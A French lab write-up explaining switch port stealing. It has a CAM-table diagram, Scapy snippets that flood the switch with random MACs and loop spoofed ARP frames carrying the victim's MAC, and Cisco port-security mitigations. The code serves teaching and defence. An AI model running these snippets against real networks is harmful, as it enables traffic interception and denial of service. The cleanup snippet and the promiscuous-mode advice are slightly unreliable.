# Port Stealing - Vol de Port Switch

## En quoi ça consiste

Le Port Stealing consiste à faire croire au switch que la victime est maintenant connectée sur le port de l'attaquant. Le switch apprend les adresses MAC en regardant l'adresse **SOURCE** des paquets qu'il reçoit. Si l'attaquant envoie des paquets avec la MAC de la victime comme source, le switch met à jour sa table CAM.

### Principe

```
AVANT L'ATTAQUE (Normal):

  PC1 (192.168.189.200)          PC2 (192.168.189.201)
  MAC: AA:AA:AA                  MAC: BB:BB:BB
       |                              |
       Et0/0                     Et0/1
       +----------- Switch -----------+
                    |
                   Et0/2
                  Rocky (192.168.189.128)
                  MAC: CC:CC:CC

  Table CAM du switch:
  AA:AA:AA → Et0/0  (PC1)
  BB:BB:BB → Et0/1  (PC2)
  CC:CC:CC → Et0/2  (Rocky)


PENDANT L'ATTAQUE (Port Stealing):

  Rocky envoie des paquets avec src=AA:AA:AA (MAC de PC1)
  Le switch voit AA:AA:AA venir de Et0/2 → il met à jour sa table!

  Table CAM du switch (après attaque):
  AA:AA:AA → Et0/2  (Rocky a volé le port!)
  BB:BB:BB → Et0/1  (PC2)
  CC:CC:CC → Et0/2  (Rocky)

  Résultat:
  PC2 veut envoyer à PC1 → Le switch envoie à Et0/2 (Rocky)
  PC1 ne reçoit plus rien!
```

### Résultat
- Le switch associe la MAC de la victime au port de l'attaquant
- Tout le trafic destiné à la victime arrive chez l'attaquant
- La victime ne reçoit plus ses paquets (déni de service)

## Explication du Code

### port_stealing.py

```python
def port_stealing(victim_ip, interface="ens224"):
```
Prend l'IP de la victime et l'interface réseau.

```python
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), timeout=2, iface=interface, verbose=False)
victim_mac = ans[0][1].hwsrc
```
Résout l'adresse MAC de la victime via une requête ARP.

```python
for _ in range(200):
    mac = RandMAC()
    sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1), iface=interface, verbose=False)
```
Flood la table CAM avec 200 fausses MAC pour forcer le switch à réapprendre les adresses.

```python
pkt = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=victim_ip, hwsrc=victim_mac)
while True:
    sendp(pkt, iface=interface, verbose=False)
    time.sleep(0.05)
```
Envoie en boucle des paquets avec la MAC de la victime comme **source**. Le switch met à jour sa table CAM : `victim_mac → port de l'attaquant`.

```python
except KeyboardInterrupt:
    send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), iface=interface, verbose=False)
    time.sleep(1)
```
Quand on arrête (Ctrl+C), envoie une requête ARP à la victime. Sa réponse forcera le switch à remettre la vraie MAC sur le bon port.

## Comment empêcher cette attaque

### Sur le switch Cisco (Port Security)
```
Switch(config)# interface Et0/2
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 1
Switch(config-if)# switchport port-security mac-address sticky
Switch(config-if)# switchport port-security violation shutdown
```

### Explication des commandes
- `maximum 1` : Une seule MAC autorisée par port
- `sticky` : Apprend et mémorise la première MAC vue
- `violation shutdown` : Coupe le port si une autre MAC est détectée

### Sur les machines
- Désactiver le promiscuous mode
- Surveiller les changements de table CAM avec SNMP
